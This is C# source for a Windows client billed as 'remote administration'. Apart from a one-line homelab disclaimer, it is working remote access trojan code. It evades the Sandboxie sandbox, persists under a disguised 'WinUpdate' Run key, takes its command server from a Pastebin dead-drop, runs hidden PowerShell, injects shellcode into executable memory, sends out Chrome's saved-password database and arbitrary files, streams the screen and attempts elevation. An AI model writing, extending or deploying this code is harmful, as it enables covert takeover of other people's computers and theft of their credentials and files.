// Brother Client - Remote Administration for Windows
// Author: Riverside1114
// Notice: Only use in Homelabs or on Devices you own!



using System;
using System.Net;
using System.Net.WebSockets;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Linq;
using System.Net.NetworkInformation;
using System.Collections.Concurrent;

namespace PremierClient
{
    class Program
    {
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr GetModuleHandle(string lpModuleName);

        static string pastebinUrl = "https://pastebin.com/raw/CHANGE_ME";
        static string currentWsUrl = "";
        static ClientWebSocket ws;
        static Process psProcess;
        static StreamWriter psInput;
        static bool rdActive = false;

        [STAThread]
        static async Task Main(string[] args)
        {
            if (GetModuleHandle("SbieDll.dll") != IntPtr.Zero) Environment.Exit(0);

            SetPersistence();
            StartPowerShell();

            _ = Task.Run(async () => {
                while (true) { await CheckPastebin(); await Task.Delay(300000); }
            });

            await ConnectLoop();
        }

        static async Task ConnectLoop()
        {
            while (true)
            {
                try
                {
                    if (string.IsNullOrEmpty(currentWsUrl)) { await Task.Delay(5000); continue; }
                    ws = new ClientWebSocket();
                    await ws.ConnectAsync(new Uri(currentWsUrl), CancellationToken.None);
                    await SendText($"{Environment.MachineName}|{Environment.UserName}|{Environment.OSVersion}");

                    while (ws.State == WebSocketState.Open)
                    {
                        var buffer = new byte[8192];
                        var res = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                        if (res.MessageType == WebSocketMessageType.Close) break;
                        string cmd = Encoding.UTF8.GetString(buffer, 0, res.Count).Trim();
                        if (!string.IsNullOrEmpty(cmd)) await HandleCommand(cmd);
                    }
                }
                catch { await Task.Delay(5000); }
            }
        }

        static void StartPowerShell()
        {
            try
            {
                if (psProcess != null && !psProcess.HasExited) return;
                psProcess = new Process();
                psProcess.StartInfo = new ProcessStartInfo("powershell.exe")
                {
                    Arguments = "-ExecutionPolicy Bypass -NoProfile -NoLogo",
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8
                };
                psProcess.OutputDataReceived += (s, e) => { if (!string.IsNullOrEmpty(e.Data)) _ = SendText("PS_OUTPUT:" + e.Data + "\n"); };
                psProcess.ErrorDataReceived += (s, e) => { if (!string.IsNullOrEmpty(e.Data)) _ = SendText("PS_OUTPUT:ERROR: " + e.Data + "\n"); };
                psProcess.Start();
                psProcess.BeginOutputReadLine();
                psProcess.BeginErrorReadLine();
                psInput = psProcess.StandardInput;
                psInput.AutoFlush = true;
            }
            catch (Exception ex) { _ = SendText("PS_OUTPUT:Failed to start PS: " + ex.Message); }
        }

        static async Task HandleCommand(string cmd)
        {
            try
            {
                if (cmd.StartsWith("!ps "))
                {
                    if (psInput != null) psInput.WriteLine(cmd.Substring(4));
                    else { StartPowerShell(); psInput.WriteLine(cmd.Substring(4)); }
                }
                else if (cmd.StartsWith("!asm ")) InjectShellcode(cmd.Substring(5));
                else if (cmd.StartsWith("!msg ")) MessageBox.Show(cmd.Substring(5));
                else if (cmd.StartsWith("!web ")) Process.Start(new ProcessStartInfo(cmd.Substring(5)) { UseShellExecute = true });
                else if (cmd == "!taskmgr") SendTaskList();
                else if (cmd == "!tcp") SendTcpConnections();
                else if (cmd == "!elevate") TryElevate();
                else if (cmd == "!passwords") await RecoverChromium();
                else if (cmd.StartsWith("!ls ")) await SendFileList(cmd.Substring(4));
                else if (cmd.StartsWith("!download ")) await SendFileContent(cmd.Substring(10));
                else if (cmd == "!start_rd") { rdActive = true; _ = Task.Run(() => StreamDesktop()); }
                else if (cmd == "!stop_rd") rdActive = false;
            }
            catch { }
        }

        
        static async Task StreamDesktop()
        {
            while (rdActive && ws.State == WebSocketState.Open)
            {
                try
                {
                    using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bmp)) g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                        using (MemoryStream ms = new MemoryStream())
                        {
                            
                            ImageCodecInfo jpgEncoder = ImageCodecInfo.GetImageEncoders().FirstOrDefault(x => x.FormatID == ImageFormat.Jpeg.Guid);
                            EncoderParameters p = new EncoderParameters(1);
                            p.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 40L);

                            if (jpgEncoder != null)
                            {
                                bmp.Save(ms, jpgEncoder, p);
                                await SendText("RD_FRAME:" + Convert.ToBase64String(ms.ToArray()));
                            }
                        }
                    }
                }
                catch { break; }
                await Task.Delay(200);
            }
        }

        static void SendTaskList()
        {
            var list = Process.GetProcesses().Select(p => $"{p.ProcessName}|{p.Id}").ToArray();
            _ = SendText("TASKS:" + string.Join(";", list));
        }

        static void SendTcpConnections()
        {
            var props = IPGlobalProperties.GetIPGlobalProperties();
            var conns = props.GetActiveTcpConnections().Select(c => $"{c.LocalEndPoint}|{c.RemoteEndPoint}|{c.State}").ToArray();
            _ = SendText("TCP:" + string.Join(";", conns));
        }

        static async Task SendFileList(string path)
        {
            try
            {
                var dirs = Directory.GetDirectories(path).Select(d => "[DIR]|" + Path.GetFileName(d));
                var files = Directory.GetFiles(path).Select(f => "[FILE]|" + Path.GetFileName(f));
                await SendText("FILES:" + string.Join(";", dirs.Concat(files)));
            }
            catch { await SendText("ERR: Access Denied"); }
        }

        static async Task SendFileContent(string path)
        {
            try { byte[] b = File.ReadAllBytes(path); await SendText("FILE_DATA:" + Convert.ToBase64String(b)); } catch { }
        }

        static async Task RecoverChromium()
        {
            try
            {
                string p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Login Data");
                if (File.Exists(p))
                {
                    string t = Path.GetTempFileName(); File.Copy(p, t, true);
                    byte[] b = File.ReadAllBytes(t); File.Delete(t);
                    await SendText("CHROME_DB:" + Convert.ToBase64String(b));
                }
            }
            catch { }
        }

        static void InjectShellcode(string b64)
        {
            byte[] c = Convert.FromBase64String(b64);
            IntPtr a = VirtualAlloc(IntPtr.Zero, (uint)c.Length, 0x3000, 0x40);
            Marshal.Copy(c, 0, a, c.Length);
            CreateThread(IntPtr.Zero, 0, a, IntPtr.Zero, 0, IntPtr.Zero);
        }

        static void SetPersistence()
        {
            try
            {
                string p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WinUpdate.exe");
                if (!File.Exists(p)) File.Copy(Application.ExecutablePath, p);
                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).SetValue("WinUpdate", p);
            }
            catch { }
        }

        static void TryElevate()
        {
            try { Process.Start(new ProcessStartInfo(Application.ExecutablePath) { Verb = "runas", UseShellExecute = true }); Environment.Exit(0); } catch { }
        }

        static async Task CheckPastebin()
        {
            try { using (WebClient wc = new WebClient()) { string s = await wc.DownloadStringTaskAsync(pastebinUrl); currentWsUrl = s.Trim().Replace("http", "ws"); } } catch { }
        }

        static async Task SendText(string t)
        {
            try
            {
                if (ws != null && ws.State == WebSocketState.Open)
                {
                    byte[] b = Encoding.UTF8.GetBytes(t);
                    await ws.SendAsync(new ArraySegment<byte>(b), WebSocketMessageType.Text, true, CancellationToken.None);
                }
            }
            catch { }
        }
    }
}